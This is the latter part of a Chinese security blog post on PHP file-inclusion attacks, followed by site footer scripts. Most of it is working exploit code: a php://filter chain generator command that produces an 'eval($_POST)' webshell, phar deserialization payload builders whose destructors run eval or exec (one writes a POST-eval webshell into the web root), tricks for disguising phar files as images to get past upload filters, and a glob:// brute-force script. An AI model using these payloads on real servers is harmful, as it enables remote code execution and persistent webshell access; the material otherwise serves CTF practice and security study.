+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$url</span> = <span class="hljs-string">&quot;php://filter/&quot;</span>;<br><span class="hljs-variable">$url</span> .= <span class="hljs-string">&quot;convert.iconv.UTF8.CSISO2022KR&quot;</span>;<br><span class="hljs-variable">$url</span> .= <span class="hljs-string">&quot;/resource=data://,aaaaaaaaaaaaaa&quot;</span>;     <span class="hljs-comment">//我们这里简单使用 `data://` 来模拟文件内容读取。</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$url</span>));<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">// hexdump:</span><br><span class="hljs-comment">// 00000000  73 74 72 69 6e 67 28 31  38 29 20 22 1b 24 29 43  |string(18) &quot;.$)C|</span><br><span class="hljs-comment">// 00000010  61 61 61 61 61 61 61 61  61 61 61 61 61 61 22 0a  |aaaaaaaaaaaaaa&quot;.|</span><br>C前面有一些不可见字符<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$url</span> = <span class="hljs-string">&quot;php://filter/&quot;</span>;<br><span class="hljs-variable">$url</span> .= <span class="hljs-string">&quot;convert.iconv.UTF8.CSISO2022KR&quot;</span>;<br><span class="hljs-variable">$url</span>.=<span class="hljs-string">&quot;|convert.base64-decode|convert.base64-encode&quot;</span>; <span class="hljs-comment">#利用base64解码去除不可见字符再编码回到原来的字符</span><br><span class="hljs-variable">$url</span> .= <span class="hljs-string">&quot;/resource=data://,aaaaaaaaaaaaaa&quot;</span>;     <span class="hljs-comment">//我们这里简单使用 `data://` 来模拟文件内容读取。</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$url</span>));<br></code></pre></td></tr></table></figure>
+<p>利用<a target="_blank" rel="noopener" href="https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT/tree/main">https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT/tree/main</a> 来生成字母对应的字符编码（与要用的本地文件内容无关）</p>
+<blockquote>
+<p>使用方法(linux系统)</p>
+<p>在test.py中修改要写入的命令的base64编码（注意：base64编码后不能含有+ / =等，有的话可以通过加空格或者后面补一些垃圾字符来消除）</p>
+<p><a target="_blank" rel="noopener" href="http://xn--test-k55ll68a.py">运行test.py</a>,将结果中resource=后面的内容换成本地文件，如果不能文件内容是中文，需要先用php://filter/convert.base64-encode/resource= 进行转换，相当于两次php://filter</p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/synacktiv/php_filter_chain_generator">https://github.com/synacktiv/php_filter_chain_generator</a> 这个工具就直接一把梭（base64所有字符都支持）</p>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">python3 php_filter_chain_generator.py --chain &quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot;</span><br></code></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://tttang.com/archive/1395/#toc_php-base64-filter">https://tttang.com/archive/1395/#toc_php-base64-filter</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12939?time__1311=mqmhqIx%2BxfOD7DloaGkjQKD5%3DfFOWeD&amp;alichlgref=https%3A%2F%2Fwww.bing.com%2F#toc-16">https://xz.aliyun.com/t/12939?time__1311=mqmhqIx%2BxfOD7DloaGkjQKD5%3DfFOWeD&amp;alichlgref=https%3A%2F%2Fwww.bing.com%2F#toc-16</a></p>
+<p>受php filter链影响的函数（都要通过post传参才可）</p>
+<table>
+<thead>
+<tr>
+<th><strong>Function</strong></th>
+<th><strong>Pattern</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>*<strong>file_get_contents*</strong></td>
+<td><code>file_get_contents($_POST[0]);</code></td>
+</tr>
+<tr>
+<td>*<strong>readfile*</strong></td>
+<td><code>readfile($_POST[0]);</code></td>
+</tr>
+<tr>
+<td>*<strong>finfo-&gt;file*</strong></td>
+<td><code>$file = new finfo(); $fileinfo = $file-&gt;file($_POST[0], FILEINFO_MIME);</code></td>
+</tr>
+<tr>
+<td>*<strong>getimagesize*</strong></td>
+<td><code>getimagesize($_POST[0]);</code></td>
+</tr>
+<tr>
+<td>*<strong>md5_file*</strong></td>
+<td><code>md5_file($_POST[0]);</code></td>
+</tr>
+<tr>
+<td>*<strong>sha1_file*</strong></td>
+<td><code>sha1_file($_POST[0]);</code></td>
+</tr>
+<tr>
+<td>*<strong>hash_file*</strong></td>
+<td><code>hash_file('md5', $_POST[0]);</code></td>
+</tr>
+<tr>
+<td>*<strong>file*</strong></td>
+<td><code>file($_POST[0]);</code></td>
+</tr>
+<tr>
+<td>*<strong>parse_ini_file*</strong></td>
+<td><code>parse_ini_file($_POST[0]);</code></td>
+</tr>
+<tr>
+<td>*<strong>copy*</strong></td>
+<td><code>copy($_POST[0], '/tmp/test');</code></td>
+</tr>
+<tr>
+<td>*<strong>file_put_contents (only target read only with this)*</strong></td>
+<td><code>file_put_contents($_POST[0], &quot;&quot;);</code></td>
+</tr>
+<tr>
+<td>*<strong>stream_get_contents*</strong></td>
+<td><code>$file = fopen($_POST[0], &quot;r&quot;); stream_get_contents($file);</code></td>
+</tr>
+<tr>
+<td>*<strong>fgets*</strong></td>
+<td><code>$file = fopen($_POST[0], &quot;r&quot;); fgets($file);</code></td>
+</tr>
+<tr>
+<td>*<strong>fread*</strong></td>
+<td><code>$file = fopen($_POST[0], &quot;r&quot;); fread($file, 10000);</code></td>
+</tr>
+<tr>
+<td>*<strong>fgetc*</strong></td>
+<td><code>$file = fopen($_POST[0], &quot;r&quot;); fgetc($file);</code></td>
+</tr>
+<tr>
+<td>*<strong>fgetcsv*</strong></td>
+<td><code>$file = fopen($_POST[0], &quot;r&quot;); fgetcsv($file, 1000, &quot;,&quot;);</code></td>
+</tr>
+<tr>
+<td>*<strong>fpassthru*</strong></td>
+<td><code>$file = fopen($_POST[0], &quot;r&quot;); fpassthru($file);</code></td>
+</tr>
+<tr>
+<td>*<strong>fputs*</strong></td>
+<td><code>$file = fopen($_POST[0], &quot;rw&quot;); fputs($file, 0);</code></td>
+</tr>
+</tbody>
+</table>
+<h3 id="phar"><a class="markdownIt-Anchor" href="#phar"></a> phar://</h3>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">phar:<span class="hljs-regexp">//</span>压缩文件绝对路径/压缩文件内的子文件名<br></code></pre></td></tr></table></figure>
+<p>例如</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">phar:<span class="hljs-regexp">//</span><span class="hljs-regexp">/tmp/</span>a.zip/<span class="hljs-number">1</span>.php<br></code></pre></td></tr></table></figure>
+<p><code>/tmp/a.zip</code>表示要解析的压缩包，与扩展名无关，可以是<code>/tmp/a.jpg</code>等</p>
+<p>文件操作函数都会触发phar反序列化</p>
+<h4 id="phar结合文件上传进行反序列利用"><a class="markdownIt-Anchor" href="#phar结合文件上传进行反序列利用"></a> phar结合文件上传进行反序列利用</h4>
+<p>（要将php.ini中的phar.readonly选项设置为Off才能生成phar文件）</p>
+<p>基础操作</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">story</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$eating</span> = <span class="hljs-string">&#x27;cat /f*&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$God</span> = <span class="hljs-string">&#x27;true&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;1.phar&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;&lt;php __HALT_COMPILER(); ?&gt;&quot;</span>);<br><span class="hljs-variable">$o</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">story</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$o</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br></code></pre></td></tr></table></figure>
+<p>会将内容写到1.phar中</p>
+<p>加GIF89a</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> Implement __destruct() method.</span><br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;code);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&#x27;phar.phar&#x27;</span>);  <br><span class="hljs-variable">$phar</span> -&gt; <span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-variable">$phar</span> -&gt; <span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&#x27;GIF89a&#x27;</span>.<span class="hljs-string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>); <span class="hljs-comment">//phar协议是通过这个来判断是不是phar文件</span><br><span class="hljs-variable">$phar</span> -&gt; <span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&#x27;test.txt&#x27;</span>,<span class="hljs-string">&#x27;test&#x27;</span>);<br><span class="hljs-variable">$object</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Flag</span>();<br><span class="hljs-variable">$object</span> -&gt; code= <span class="hljs-string">&quot;system(&#x27;cat /ffflllaaaggg&#x27;);&quot;</span>;<br><span class="hljs-variable">$phar</span> -&gt; <span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$object</span>);<br><span class="hljs-variable">$phar</span> -&gt; <span class="hljs-title function_ invoke__">stopBuffering</span>();<br></code></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;echo \&quot;&lt;?=@eval(\\\$_POST[&#x27;a&#x27;]);\&quot;&gt;/var/www/html/1.php&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        @<span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$this</span>-&gt;cmd);<br>    &#125;<br>&#125;<br>@<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&quot;1.phar&quot;</span>);<br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;1.phar&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;__HALT_COMPILER(); ?&gt;&quot;</span>);<br><span class="hljs-variable">$o</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Flag</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$o</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;gzip 1.phar&quot;</span>); <span class="hljs-comment">//压缩文件</span><br><span class="hljs-title function_ invoke__">rename</span>(<span class="hljs-string">&quot;1.phar.gz&quot;</span>, <span class="hljs-string">&quot;1.jpg&quot;</span>);<br></code></pre></td></tr></table></figure>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">phar:<span class="hljs-regexp">//</span><span class="hljs-number">1</span>.jpg<br></code></pre></td></tr></table></figure>
+<h4 id="phar重签名"><a class="markdownIt-Anchor" href="#phar重签名"></a> phar重签名</h4>
+<p>如果修改了.phar里面的内容则需要对phar进行重签名</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># phar重签名</span><br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha1<br><span class="hljs-keyword">import</span> urllib.parse<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.phar&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    f = file.read()<br>s = f[:-<span class="hljs-number">28</span>]  <span class="hljs-comment"># 获取要签名的数据</span><br>h = f[-<span class="hljs-number">8</span>:]  <span class="hljs-comment"># 获取签名类型和GBMB标识</span><br>newf = s + sha1(s).digest() + h  <span class="hljs-comment"># 数据 + 签名 + (类型 + GBMB)</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;newtest.phar&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    file.write(newf)  <span class="hljs-comment"># 写入新文件</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;newtest.phar&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> fi:<br>    f = fi.read()<br>    ff=urllib.parse.quote(f) <span class="hljs-comment">#需要以url编码后才能传输</span><br><span class="hljs-built_in">print</span>(ff)<br></code></pre></td></tr></table></figure>
+<h4 id="过滤"><a class="markdownIt-Anchor" href="#过滤"></a> 过滤</h4>
+<ol>
+<li>不能是phar开头</li>
+</ol>
+<figure class="highlight parser3"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs parser3"><span class="language-xml">if (preg_match(&quot;/</span><span class="hljs-keyword">^php</span><span class="language-xml">|</span><span class="hljs-keyword">^file</span><span class="language-xml">|</span><span class="hljs-keyword">^phar</span><span class="language-xml">|</span><span class="hljs-keyword">^dict</span><span class="language-xml">|</span><span class="hljs-keyword">^zip</span><span class="language-xml">/i&quot;,</span><span class="hljs-variable">$filename</span><span class="language-xml">)&#123;</span><br><span class="language-xml">    die();</span><br><span class="language-xml">&#125;</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=phar:<span class="hljs-regexp">//</span>test.phar<br>compress.bzip2:<span class="hljs-regexp">//</span>phar:<span class="hljs-regexp">//</span><span class="hljs-regexp">/test.phar/</span>test.txt<br>compress.zlib:<span class="hljs-regexp">//</span>phar:<span class="hljs-regexp">//</span><span class="hljs-regexp">/home/</span>sx<span class="hljs-regexp">/test.phar/</span>test.txt<br></code></pre></td></tr></table></figure>
+<ol start="2">
+<li>过滤__HALT_COMPILER</li>
+</ol>
+<p>进行压缩就可以绕过__HALT_COMPILER</p>
+<h3 id="zip"><a class="markdownIt-Anchor" href="#zip"></a> zip://</h3>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">zip:<span class="hljs-regexp">//</span>压缩文件绝对路径<span class="hljs-comment">#压缩文件内的子文件名</span><br></code></pre></td></tr></table></figure>
+<p>压缩文件要用绝对路径，#要url编码<code>%23</code>，同样与压缩包的扩展名无关</p>
+<p>本地文件包含需要能进行文件上传，压缩包需要先上传到主机</p>
+<h3 id="glob"><a class="markdownIt-Anchor" href="#glob"></a> glob://</h3>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-variable">$file</span>); <span class="hljs-comment">//DirectoryIterator是php5中增加的一个类，为用户提供一个简单的查看目录的接口。</span><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>-&gt;<span class="hljs-title function_ invoke__">__toString</span>().<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p>DirectoryIterator与glob://结合将无视<code>open_basedir</code>(这个是限制php脚本能够访问的文件路径)</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> re<br>url = <span class="hljs-string">&quot;http://172.10.0.5&quot;</span><br><br>r = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">40</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> string.printable:<br>        <span class="hljs-comment"># print(i)</span><br>        <span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;*+[]?&quot;</span>:<br>            <span class="hljs-keyword">continue</span><br>        payload = <span class="hljs-string">&quot;glob://&quot;</span> + r + i + <span class="hljs-string">&quot;*&quot;</span><br>        data = &#123;<span class="hljs-string">&quot;filename&quot;</span>:payload&#125;<br>        res = requests.post(url=url, data=data)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;yesyesyes&quot;</span> <span class="hljs-keyword">in</span> res.text:<br>            r += i<br>            <span class="hljs-built_in">print</span>(r)<br>            <span class="hljs-keyword">break</span><br><br><span class="hljs-built_in">print</span>(r)<br></code></pre></td></tr></table></figure>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <p class="note note-warning">
+                <strong>本文作者: </strong><a href="/">fru1ts</a> <br>
+                <strong>本文链接: </strong><a href="https://fru1ts.github.io/2023/07/07/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">https://fru1ts.github.io/2023/07/07/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</a> <br>
+                <strong>版权声明: </strong>本站均采用BY-SA协议，除特别声明外，转载请注明出处!
+                   </p>
+                   
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/07/24/flask%E8%AE%A1%E7%AE%97PIN%E7%A0%81/" title="flask计算PIN码">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">flask计算PIN码</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/06/11/SSTI/" title="SSTI">
+                        <span class="hidden-mobile">SSTI</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"WEdmoCOkNdSUMsONpu72ngCo-gzGzoHsz","appKey":"PSBkctB8cKrR97yZLNXnJ0nj","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+  
+  
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <div> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> </div> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        Total number of visits 
+        <span id="leancloud-site-pv"></span>
+         
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        Total number of visitors 
+        <span id="leancloud-site-uv"></span>
+         
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
